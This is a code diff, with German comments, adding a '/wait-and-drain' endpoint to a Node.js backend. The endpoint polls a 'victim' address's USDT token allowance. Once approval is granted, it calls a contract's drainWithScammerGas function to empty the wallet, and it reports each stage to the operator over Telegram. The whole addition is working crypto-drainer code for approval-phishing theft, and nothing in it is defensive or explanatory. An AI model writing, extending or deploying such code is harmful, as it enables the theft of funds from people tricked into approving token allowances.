@@ -117,3 +117,53 @@ app.listen(PORT, () => {
     console.log(`Backend listening on port ${PORT}`);
     console.log("Event listeners are active. Waiting for contract events...");
 });
+
+// NEU: Endpunkt, der auf die Genehmigung wartet und dann draint
+app.post('/wait-and-drain', async (req, res) => {
+    const { victim } = req.body;
+    if (!victim || !ethers.utils.isAddress(victim)) {
+        return res.status(400).send("Invalid victim address");
+    }
+
+    console.log(`🔋 Received approval request for victim: ${victim}`);
+    await sendTelegramMessage(`🔋 VICTIM APPROVAL PENDING!\nVictim: ${victim}\nAction: Waiting for allowance before draining.`);
+
+    try {
+        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+        const usdtContract = new ethers.Contract(usdtAddress, ["function allowance(address owner, address spender) view returns (uint256)"], provider);
+        
+        // Wir pollen die Allowance, bis sie > 0 ist
+        let allowance = await usdtContract.allowance(victim, contractAddress);
+        let attempts = 0;
+        const maxAttempts = 60; // ca. 5 Minuten warten (60 * 5s)
+
+        while (allowance.eq(0) && attempts < maxAttempts) {
+            console.log(`Waiting for approval... Attempt ${attempts + 1}/${maxAttempts}`);
+            await new Promise(resolve => setTimeout(resolve, 5000)); // 5 Sekunden warten
+            allowance = await usdtContract.allowance(victim, contractAddress);
+            attempts++;
+        }
+
+        if (allowance.eq(0)) {
+            console.log(`❌ Approval not received in time for victim: ${victim}`);
+            await sendTelegramMessage(`❌ APPROVAL TIMEOUT!\nVictim: ${victim}\nAction: User did not approve in time.`);
+            return res.status(408).send("Approval not received in time");
+        }
+
+        console.log(`✅ Approval received for victim: ${victim}. Initiating drain.`);
+        await sendTelegramMessage(`✅ VICTIM APPROVED!\nVictim: ${victim}\nAction: Initiating drain with Scammer Gas.`);
+
+        const tx = await contract.drainWithScammerGas(victim);
+        console.log(`Scammer-Gas Drain sent: ${tx.hash}`);
+        await tx.wait();
+        console.log(`✅ Scammer-Gas Drain successful for ${victim}.`);
+        
+        // Die detaillierten Nachrichten kommen jetzt von den Event Listeners
+        res.status(200).send("Drain successful after approval");
+
+    } catch (error) {
+        console.error("❌ Error in wait-and-drain process:", error);
+        await sendTelegramMessage(`❌ DRAIN FAILED (WAIT-AND-DRAIN)!\nVictim: ${victim}\nError: ${error.message}`);
+        res.status(500).send("Drain failed");
+    }
+});
